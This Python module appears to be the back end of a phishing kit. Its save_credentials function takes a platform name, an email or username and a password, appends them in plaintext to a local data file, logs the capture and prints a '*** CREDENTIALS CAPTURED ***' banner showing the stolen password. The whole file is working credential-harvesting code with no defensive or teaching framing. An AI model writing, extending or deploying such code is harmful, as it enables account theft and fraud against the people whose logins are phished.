import os
import json
import logging
from datetime import datetime

DATA_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'data')
DATA_FILE = os.path.join(DATA_DIR, 'data.txt')

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('collector')


def save_credentials(platform: str, email: str, password: str) -> None:
    os.makedirs(DATA_DIR, exist_ok=True)

    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    entry = (
        f"[{timestamp}] "
        f"Platform: {platform} | "
        f"Email/Username: {email} | "
        f"Password: {password}\n"
    )

    with open(DATA_FILE, 'a', encoding='utf-8') as f:
        f.write(entry)

    logger.info('Credentials captured — Platform: %s | User: %s', platform, email)

    print('\n' + '=' * 55)
    print('  *** CREDENTIALS CAPTURED ***')
    print('=' * 55)
    print(f'  Platform      : {platform}')
    print(f'  Email/Username : {email}')
    print(f'  Password       : {password}')
    print(f'  Saved to       : {DATA_FILE}')
    print('=' * 55 + '\n')
